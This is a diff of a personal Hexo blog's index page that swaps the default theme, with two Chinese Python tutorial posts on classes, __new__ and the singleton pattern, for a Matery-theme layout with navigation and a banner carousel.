@@ -1,1516 +1,1111 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
 <head>
-  <meta charset="utf-8">
-  
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="Hexo">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
 
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://fightingtree.github.io/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="fightingtree">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
 
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
 <meta name="generator" content="Hexo 4.2.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
         
-          <a class="main-nav-link" href="/">Home</a>
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
         
-      </nav>
-      <nav id="sub-nav">
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://fightingtree.github.io"></form>
-      </div>
-    </div>
-  </div>
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/fightingtree/fightingtree.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #c2185b;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/fightingtree/fightingtree.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
 </header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-python7" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/12/08/python7/" class="article-date">
-  <time datetime="2019-12-08T08:39:55.000Z" itemprop="datePublished">2019-12-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/08/python7/">Python(7)</a>
-    </h1>
-  
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="单例设计模式"><a href="#单例设计模式" class="headerlink" title="单例设计模式"></a>单例设计模式</h2><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><p>设计模式是前人工作的总结和提炼，通常，广泛流传的设计模式都是针对某一特定问题的成熟解决方案</p>
-<h3 id="单例设计模式-1"><a href="#单例设计模式-1" class="headerlink" title="单例设计模式"></a>单例设计模式</h3><ul>
-<li>目的：让类创建对象，在系统中只有唯一个实例对象</li>
-<li>每一侧执行<font color="#fb8c00">类名()</font>返回的对象、内存地址都是相同的</li>
-</ul>
-<h4 id="单例设计模式的应用场景"><a href="#单例设计模式的应用场景" class="headerlink" title="单例设计模式的应用场景"></a>单例设计模式的应用场景</h4><ul>
-<li>音乐播放对象(同一时间只能播放一首歌曲)</li>
-<li>回收站对象(在一个操作系统中只有一个回收站)</li>
-<li>打印机对象(打印10份文件只需要一个打印机)<br>以上对象只有唯一的一个存在</li>
-</ul>
-<h3 id="new-方法"><a href="#new-方法" class="headerlink" title="new 方法"></a><strong>new</strong> 方法</h3><ol>
-<li>使用<font color="#fb8c00">类名()</font>创建对象时，Python的解释器首先会调用<strong>new</strong> 方法为对象分配空间，<strong>new</strong> 方法是一个由Object类提供的内置静态方法，主要作用有两个：</li>
-</ol>
-<ul>
-<li>在内存中为对象分配空间</li>
-<li>返回对象的引用</li>
-</ul>
-<ol start="2">
-<li>在获得对象的引用后，将此引用作为第一个参数，传递给<strong>init</strong>方法</li>
-</ol>
-<h4 id="new-方法的重写"><a href="#new-方法的重写" class="headerlink" title="new 方法的重写"></a><strong>new</strong> 方法的重写</h4><p>重写的目的：当使用<font color="#fb8c00">类名()</font>创建对象时，无论使用多少次，在内存中只会创建出一个对象的实例</p>
-<ul>
-<li>重写<strong>new</strong> 方法一定要<font color="#fb8c00">return super().<strong>new</strong>(cls)</font></li>
-</ul>
-<h5 id="new-重写"><a href="#new-重写" class="headerlink" title="new 重写"></a><strong>new</strong> 重写</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class musicPlayer(object):</span><br><span class="line">    def __new__(cls, *args, **kwargs):</span><br><span class="line">        <span class="comment">#1.为对象分配空间</span></span><br><span class="line">        instance = super().__new__(cls)</span><br><span class="line">        <span class="comment">#2. 返回对象的引用</span></span><br><span class="line">        <span class="built_in">return</span> instance</span><br><span class="line">    def __init__(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"播放器初始化"</span>)</span><br><span class="line"></span><br><span class="line">player = musicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player)</span><br></pre></td></tr></table></figure>
-<h5 id="单例模式中的new-重写"><a href="#单例模式中的new-重写" class="headerlink" title="单例模式中的new 重写"></a>单例模式中的<strong>new</strong> 重写</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class musicPlayer(object):</span><br><span class="line">    <span class="comment">#记录第一个被创建对象的引用</span></span><br><span class="line">    instance = None</span><br><span class="line">    def __new__(cls, *args, **kwargs):</span><br><span class="line">        <span class="comment">#1.判断类属性是否是空对象，如果是空对象证明还没有创建对象</span></span><br><span class="line">        <span class="keyword">if</span> (cls.instance is None):</span><br><span class="line">            <span class="comment">#2.调用父类的方法为第一个对象分配空间</span></span><br><span class="line">            cls.instance = super().__new__(cls)</span><br><span class="line">        <span class="comment">#3.返回类属性保存的对象引用</span></span><br><span class="line">        <span class="built_in">return</span>  cls.instance</span><br><span class="line"></span><br><span class="line">player1 = musicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player1)</span><br><span class="line">player2 = musicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player2)</span><br><span class="line"><span class="comment">#输出结果： 输出结果player1 player2地址相同</span></span><br></pre></td></tr></table></figure>
-<p>执行上述代码后，每一次创建的对象地址虽然相同，但是<strong>init</strong>初始化方法仍然会在每次创建对象时被调用，现在需要初始化方法只在最初创建时调用一次：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class musicPlayer(object):</span><br><span class="line">    <span class="comment">#记录第一个被创建对象的引用</span></span><br><span class="line">    instance = None</span><br><span class="line">    <span class="comment">#记录是否执行过初始化方法</span></span><br><span class="line">    initFlag = False</span><br><span class="line">    def __new__(cls, *args, **kwargs):</span><br><span class="line">        <span class="comment">#1.判断类属性是否是空对象，如果是空对象证明还没有创建对象</span></span><br><span class="line">        <span class="keyword">if</span> (cls.instance is None):</span><br><span class="line">            <span class="comment">#2.调用父类的方法为第一个对象分配空间</span></span><br><span class="line">            cls.instance = super().__new__(cls)</span><br><span class="line">        <span class="comment">#3.返回类属性保存的对象引用</span></span><br><span class="line">        <span class="built_in">return</span>  cls.instance</span><br><span class="line">    def __init__(self):</span><br><span class="line">        <span class="comment">#1. 判断是否执行过初始化方法</span></span><br><span class="line">        <span class="keyword">if</span> (musicPlayer.initFlag == True):</span><br><span class="line">            <span class="built_in">return</span></span><br><span class="line">        <span class="comment">#2. 如果没有执行过则执行初始化方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"初始化"</span>)</span><br><span class="line">        <span class="comment">#3. 修改类属性的值</span></span><br><span class="line">        musicPlayer.initFlag = True</span><br><span class="line"></span><br><span class="line">player1 = musicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player1)</span><br><span class="line">player2 = musicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player2)</span><br></pre></td></tr></table></figure>
-<p>上述代码虽创建了两次对象，但是初始化方法<strong>init</strong> 只被调用了一次。</p>
 
-      
+<style>
+    .carousel-control {
+        width: 45px;
+        height: 45px;
+        line-height: 55px;
+        border-radius: 45px;
+        background: transparent;
+        cursor: pointer;
+        z-index: 100;
+    }
+
+    #prev-cover {
+        position: absolute;
+        top: 48%;
+        left: 8px;
+    }
+
+    #next-cover {
+        position: absolute;
+        top: 48%;
+        right: 8px;;
+    }
+
+    #prev-cover i {
+        margin-right: 3px;
+    }
+
+    #next-cover i {
+        margin-left: 3px;
+    }
+
+    .carousel-control:hover {
+        background-color:rgba(0, 0, 0, .4);
+    }
+
+    .carousel-control i {
+        color: #fff;
+        font-size: 2.4rem;
+    }
+</style>
+
+
+
+<div class="carousel carousel-slider center index-cover" data-indicators="true" style="margin-top: -64px;">
+    
+
+    <div class="carousel-item red white-text bg-cover about-cover">
+        <div class="container">
+            <div class="row">
+    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
+        <div class="brand">
+            <div class="title center-align">
+                
+                    subtitle
+                
+            </div>
+
+            <div class="description center-align">
+                
+                    This is your root _config.yml 'description' value.
+                
+            </div>
+        </div>
     </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/12/08/python7/" data-id="ck5ewyp0b003bi8tw1kvs4wpp" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OOP/" rel="tag">OOP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
+</div>
+<script>
+// 每天切换 banner 图.  Switch banner image every day.
+$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');
+</script>
 
 
-  
-    <article id="post-Python6" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/12/05/Python6/" class="article-date">
-  <time datetime="2019-12-05T11:31:35.000Z" itemprop="datePublished">2019-12-05</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3/">编程思想</a>
-  </div>
+            <div class="cover-btns">
+                <a href="#indexCard" class="waves-effect waves-light btn">
+                    <i class="fa fa-angle-double-down"></i>开始阅读
+                </a>
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/05/Python6/">Python(6)</a>
-    </h1>
-  
+                
+                <a href="https://github.com/fightingtree/fightingtree.github.io" class="waves-effect waves-light btn" target="_blank">
+                    <i class="fa fa-github-alt"></i>Github
+                </a>
+                
+            </div>
+            <div class="cover-social-link">
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="面向对象三大特性"><a href="#面向对象三大特性" class="headerlink" title="面向对象三大特性"></a>面向对象三大特性</h2><ul>
-<li>封装：根据职责将属性和方法封装到一个抽象的类中</li>
-<li>继承：实现代码的重用，相同的代码不需要重复编写</li>
-<li>多态：不同的对象调用相同的方法，产生不同的执行结果，增加代码的灵活度</li>
-</ul>
-<h2 id="dir内置函数"><a href="#dir内置函数" class="headerlink" title="dir内置函数"></a>dir内置函数</h2><p><strong>方法名</strong> :python提供的内置函数和属性<br>可以使用:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir([])   <span class="comment">#查看列表的内置函数和属性</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h2><h3 id="只包含方法"><a href="#只包含方法" class="headerlink" title="只包含方法"></a>只包含方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class 类名：</span><br><span class="line">    def 方法1(self,参数列表):</span><br><span class="line">        pass</span><br><span class="line">    def 方法2(self,参数列表):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
-<p>方法的定义格式与函数基本一样，区别在于方法的第一个参数必须是self，并且类名的命名方式必须是大驼峰命名法</p>
-<h3 id="self参数"><a href="#self参数" class="headerlink" title="self参数"></a>self参数</h3><p>哪个对象调用该方法，self就指该对象：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def eat(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s eat fish"</span> %self.name)</span><br><span class="line">tom = Cat()</span><br><span class="line">tom.name = <span class="string">"Tom"</span>   <span class="comment">#为tom增加name属性(不推荐)</span></span><br><span class="line">tom.eat()      <span class="comment">#输出Tom eat fish</span></span><br><span class="line">bob = Cat</span><br><span class="line">bob.name =<span class="string">"Bob"</span></span><br><span class="line">bob.eat()    <span class="comment">#输出Bob eat fish</span></span><br></pre></td></tr></table></figure>
+    <a href="mailto:" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
 
-<h3 id="初始化方法"><a href="#初始化方法" class="headerlink" title="初始化方法"></a>初始化方法</h3><ol>
-<li>当使用类名创建对象时，会自动执行以下操作：</li>
-</ol>
-<ul>
-<li>为对象在内存中分配空间：创建对象</li>
-<li>为对象的属性设置初始值：初始化方法(init)</li>
-</ul>
-<ol start="2">
-<li>这个初始化方法就是<strong>init</strong>方法,<strong>init</strong> 是对象的内置方法，<strong>init</strong> 方法是专门用来定义一个类具有哪些属性的方法<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"这是一个初始化方法"</span>)</span><br><span class="line"><span class="comment"># 使用类名()创建对象时，会自动调用初始化方法__init__</span></span><br><span class="line">tom = Cat()   <span class="comment">#输出结果 这是一个初始化方法</span></span><br></pre></td></tr></table></figure>
 
-</li>
-</ol>
-<h4 id="在初始化方法内部定义属性"><a href="#在初始化方法内部定义属性" class="headerlink" title="在初始化方法内部定义属性"></a>在初始化方法内部定义属性</h4><p>在<strong>init</strong>方法内部使用self.属性名=属性的初始值 就可以定义属性。在定义属性后，再使用该类创建对象，都会拥有该属性</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name=<span class="string">"Hello"</span></span><br><span class="line">tom = Cat()</span><br><span class="line">bob = Cat()</span><br><span class="line"><span class="built_in">print</span>(tom.name)</span><br><span class="line"><span class="built_in">print</span>(bob.name)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">Hello</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure>
-<h4 id="改造初始化方法"><a href="#改造初始化方法" class="headerlink" title="改造初始化方法"></a>改造初始化方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name=name</span><br><span class="line">tom = Cat(<span class="string">"Tom"</span>)</span><br><span class="line">bob = Cat(<span class="string">"Bob"</span>)</span><br><span class="line"><span class="built_in">print</span>(tom.name)   <span class="comment">#输出Tom</span></span><br><span class="line"><span class="built_in">print</span>(bob.name)   <span class="comment">#输出Bob</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="内置方法和属性"><a href="#内置方法和属性" class="headerlink" title="内置方法和属性"></a>内置方法和属性</h3><h4 id="del-方法"><a href="#del-方法" class="headerlink" title="del 方法"></a><strong>del</strong> 方法</h4><ol>
-<li>当一个对象被从内存中销毁时，自动调用<strong>del</strong>方法</li>
-<li>如果希望对象在被销毁前再做一些事情，可以考虑<strong>del</strong> 方法</li>
-<li>生命周期：</li>
-</ol>
-<ul>
-<li>一个对象从调用类名()创建，生命周期开始</li>
-<li>一个对象<strong>del</strong>对象一旦被调用，生命周期结束</li>
-<li>在对象的生命周期内，可以访问对象属性，或者让对象调用方法</li>
-</ul>
-<h5 id="在代码执行结束后回收"><a href="#在代码执行结束后回收" class="headerlink" title="在代码执行结束后回收"></a>在代码执行结束后回收</h5><p>tom是全局变量，<strong>del</strong> 函数会在所有代码执行完毕后自动调用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name=name</span><br><span class="line">    def __del__(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s 已销毁"</span>%self.name)</span><br><span class="line">tom = Cat(<span class="string">"Tom"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"----------------------"</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">----------------------</span><br><span class="line">Tom已销毁</span><br></pre></td></tr></table></figure>
+    <a href="https://weibo.com/u/6112857421?from=myfollow_all" class="tooltipped" target="_blank" data-tooltip="访问我的微博" data-position="top" data-delay="50">
+        <i class="fa fa-weibo"></i>
+    </a>
 
-<h5 id="使用del方法删除对象"><a href="#使用del方法删除对象" class="headerlink" title="使用del方法删除对象"></a>使用del方法删除对象</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name=name</span><br><span class="line">    def __del__(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s 已销毁"</span>%self.name)</span><br><span class="line">tom = Cat(<span class="string">"Tom"</span>)</span><br><span class="line">del tom</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"----------------------"</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">Tom已销毁</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>
 
-<h4 id="str-方法"><a href="#str-方法" class="headerlink" title="str 方法"></a><strong>str</strong> 方法</h4><p>返回对象的描述信息,print函数输出使用，必须返回一个字符串</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name=name</span><br><span class="line">    def __del__(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s 已销毁"</span>%self.name)</span><br><span class="line">tom = Cat(<span class="string">"Tom"</span>)</span><br><span class="line"><span class="built_in">print</span>(tom)</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">&lt;__main__.Cat object at 0x000002D897863B88&gt;</span><br><span class="line">Tom 已销毁</span><br></pre></td></tr></table></figure>
 
-<p>使用<strong>str</strong>方法后：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Cat:</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        self.name=name</span><br><span class="line">    def __del__(self):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"%s 已销毁"</span>%self.name)</span><br><span class="line">    def __str__(self):</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"hello world"</span></span><br><span class="line">tom = Cat(<span class="string">"Tom"</span>)</span><br><span class="line"><span class="built_in">print</span>(tom)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">hello world</span><br><span class="line">Tom 已销毁</span><br></pre></td></tr></table></figure>
 
-<h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><ol>
-<li>画类图</li>
-<li>被使用的类应该先开发</li>
-<li>类与类之间调用是通过对象实现的</li>
-</ol>
-<h2 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h2><p>身份运算符被用于比较两个对象的内存地址是否一致(是否是对同一个对象的引用)。在Python中对None比较时，建议使用is判断</p>
-<ul>
-<li>is： is是判断两个标识符是不是引用同一个对象。 x is y 类似id(x)==id(y)</li>
-<li>is not： is not是判断两个标识符是不是引用不同对象。 x is not y 类似id(x)!=id(y)</li>
-</ul>
-<blockquote>
-<p>注：id()是查看变量的内存地址</p>
-</blockquote>
-<h3 id="is和-的区别"><a href="#is和-的区别" class="headerlink" title="is和==的区别"></a>is和==的区别</h3><ul>
-<li>is用于判断两个对象引用对象是否是同一个(比较地址)</li>
-<li>==用于判断引用对象的值是否相等</li>
-</ul>
